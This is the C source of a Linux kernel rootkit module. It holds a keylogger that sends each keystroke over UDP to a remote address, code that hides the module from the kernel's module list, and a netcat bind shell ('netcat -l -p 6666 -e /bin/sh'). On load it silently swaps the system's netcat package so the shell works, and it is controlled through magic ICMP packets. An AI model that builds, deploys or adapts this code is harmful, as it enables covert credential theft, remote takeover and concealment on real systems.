#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/keyboard.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netpoll.h>

/* PROTO */

int keyboard_hook(struct notifier_block *, unsigned long code, void *);

/* DATA */

#define LOG
#define KEYLOGGER_ACTIVATION_CODE 122
#define KEYLOGGER_DEACTIVATION_CODE 123
#define HIDEMODULE_ACTIVATION_CODE 124
#define HIDEMODULE_DEACTIVATION_CODE 125
#define BACKDOOR_ACTIVATION_CODE 126

static int keylogger_active = 0;
static int shift_pressed = 0;

static struct nf_hook_ops netfilter_hook;

static struct netpoll keylog_listener;

static struct notifier_block keyboard_notifier = {
  .notifier_call = keyboard_hook
};



struct list_head * hidden_module=NULL;

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymap_shift[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

/* FUNCTIONALITY */

	/* Start hiding */

	void hide_module(void){
		if(hidden_module==NULL){
			hidden_module=__this_module.list.next;
			list_del(&(__this_module.list));
		}
	}

	void unhide_module(void){
		if(hidden_module!=NULL){
			list_add(&(__this_module.list), hidden_module);
			hidden_module=NULL;
		}
	}

	/* End hiding */

	/* Start Keylogger */

	void send_pressed_keys(const char* buf){
	  netpoll_send_udp(&keylog_listener, buf,strlen(buf));
	}

	void register_keylog_listener(int src, int dest){
	    keylog_listener.name = "LRNG";
	    strlcpy(keylog_listener.dev_name, "eth0", IFNAMSIZ);
	    keylog_listener.local_ip.ip = src;
	    keylog_listener.local_ip.in.s_addr = src;
	    keylog_listener.remote_ip.ip = dest;
	    keylog_listener.remote_ip.in.s_addr = dest;
	    keylog_listener.ipv6 = 0;//no IPv6
	    keylog_listener.local_port = 6666;
	    keylog_listener.remote_port = 1337;
	    memset(keylog_listener.remote_mac, 0xff, ETH_ALEN);
	    netpoll_print_options(&keylog_listener);
	    netpoll_setup(&keylog_listener);
	}

	int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
		struct keyboard_notifier_param *param = _param;
	  	
		if (code == KBD_KEYCODE && (param->value==42 || param->value==54)){
		    	shift_pressed = param->down ? 1 : 0;
		}else if (code == KBD_KEYCODE && keylogger_active && param->down){
			const char *key = !shift_pressed ? keymap[param->value] : keymap_shift[param->value];

			#ifdef LOG
			if (code == KBD_KEYCODE && param->down) printk(KERN_ERR  "KEYLOGGER %i down  %s\n", param->value, key);
			#endif

			send_pressed_keys(key);
		}
		
		return NOTIFY_OK;
	}

	/* End Keylogger */

	/* Start Remote Shell */

	

	void shell_tasklet_fn(unsigned long data){
 		static char *envp[] = {
		        "HOME=/",
		        "TERM=linux",
		        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
		char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
		int ret = 0;
		ret = call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
		#ifdef LOG
				printk(KERN_ERR  "BACKDOOR start netcat returned  %i\n", ret);
	    #endif

	}

	DECLARE_TASKLET(shell_tasklet, shell_tasklet_fn, 0);

	void start_remote_shell(void){
		tasklet_schedule( &shell_tasklet );
	}

	void ensure_netcat_version(void){
		 static char *envp[] = {
		        "HOME=/",
		        "TERM=linux",
		        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

			    /* netcat installed in modern dirstros doesn't support the -e option. Solution install traditional netcat. 
				(could be done in a mor e elegant fashion by for example downloading the binary. 
				-> independant of the distro/packet managment tool. 
				http://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd */
		        char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL};  // -y allways answer yes
		        char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat-traditional", NULL};
			//char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
			//int ret = 0;
		        call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC);
		        call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC);
			
			
 			//ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
		    //#ifdef LOG
			//	printk(KERN_ERR  "BACKDOOR start netcat returned  %i\n", ret);
			//#endif

		        //ret = call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
			    #ifdef LOG
					//printk(KERN_ERR  "BACKDOOR install netcat returned  %i\n", ret);
				#endif
			    //ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); // Launch netcat the fisrt time
			    #ifdef LOG
					//printk(KERN_ERR  "BACKDOOR run netcat returned  %i\n", ret);
				#endif
	}

	/* End Remote Shell */

	/* Start magic packets */

	static void handle_magic_packet(int code, int src, int dest){
		switch(code){
			case KEYLOGGER_ACTIVATION_CODE :
				if(!keylogger_active)
				      register_keylog_listener(src, dest);
				
		    		keylogger_active = 1;
				#ifdef LOG
					printk(KERN_ERR  "KEYLOGGER ACTIVATION PACKAGE!");
				#endif
				break;
			case KEYLOGGER_DEACTIVATION_CODE :
				keylogger_active = 0;
				#ifdef LOG
					printk(KERN_ERR  "KEYLOGGER DE-ACTIVATION PACKAGE!");
				#endif
				break;
			case HIDEMODULE_ACTIVATION_CODE :
				hide_module();
				break;
			case HIDEMODULE_DEACTIVATION_CODE :
				unhide_module();
				break;
			case BACKDOOR_ACTIVATION_CODE :
				start_remote_shell();
				#ifdef LOG
					printk(KERN_ERR  "BACKDOOR ACTIVATION PACKAGE!");
				#endif
				break;
		}    
	}

	static unsigned int filter_magic_packets(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
	  	struct iphdr *iph;
	   	struct icmphdr *icmph;

	   	if(skb == NULL) return -1;

	   	iph = ip_hdr(skb);
	   	if(iph->protocol == IPPROTO_ICMP){ 
			icmph = icmp_hdr(skb);
			// it is a magic packet iif code and echo.id are the same, we use numbers out of the normally used range
			if(icmph->type == ICMP_ECHO && icmph->code == icmph->un.echo.id) 
				handle_magic_packet(icmph->code,iph->daddr, iph->saddr);
		   }
	   return NF_ACCEPT;
	}

	
	void register_magic_packet_hook(void){
		netfilter_hook.hook = (nf_hookfn*) filter_magic_packets;
		netfilter_hook.hooknum = 0;
		netfilter_hook.pf = PF_INET;
		netfilter_hook.priority = 1;
		nf_register_hook(&netfilter_hook);
	}

	void unregister_magic_packet_hook(void){
		nf_unregister_hook(&netfilter_hook);
	}

	/* End magic packets */


/*BOOTSTRAPING*/

static int __init rootkit_start(void){
//	hide_module();
	ensure_netcat_version();
	register_keyboard_notifier(&keyboard_notifier);

	register_magic_packet_hook();

	return 0;
}

static void __exit rootkit_end(void){
	unregister_keyboard_notifier(&keyboard_notifier);
	unregister_magic_packet_hook();
	tasklet_kill( &shell_tasklet );
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
